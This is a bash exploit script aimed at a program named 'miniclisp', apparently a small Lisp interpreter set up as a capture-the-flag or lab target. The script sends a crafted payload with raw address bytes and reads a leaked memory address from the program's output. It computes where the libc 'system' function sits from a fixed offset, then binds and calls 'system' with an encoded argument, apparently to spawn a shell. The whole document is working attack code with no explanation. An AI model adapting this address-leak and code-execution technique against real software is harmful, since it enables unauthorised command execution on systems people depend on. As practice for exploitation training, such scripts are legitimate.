#!/bin/bash
OUTPUTFILE=output.tmp

NEWLINE=0
function getadress {
	ADRESS=$(cat $OUTPUTFILE | grep "> 0x"| cut -c 3-)
	NEWLINE=$(./hexto32byte $ADRESS 0x183970)
}
getadress
echo "last output addre: $ADRESS line: $NEWLINE"
NEWLINE=0

SHCODE=$'(define a \xe0\x85\x04\x08aaaaaabbbbbbbbbbccccccccccdd)\x0Aa\x0A(a 11476760015141)\x0A'
echo  "$SHCODE" >exploit1.txt

if [ "$1" == "-g"  ]
	then gdb -ex "set args ARGUMENT < exploit1.txt" miniclisp
else
	(echo -e "$SHCODE\n"; sleep 1; getadress; echo -e "(+ 1336 1)\n(define system $NEWLINE)\n(+ 1 41)\nsystem\n(system 2666245823313162030)\n"; sleep 100) | ./miniclisp > $OUTPUTFILE
fi
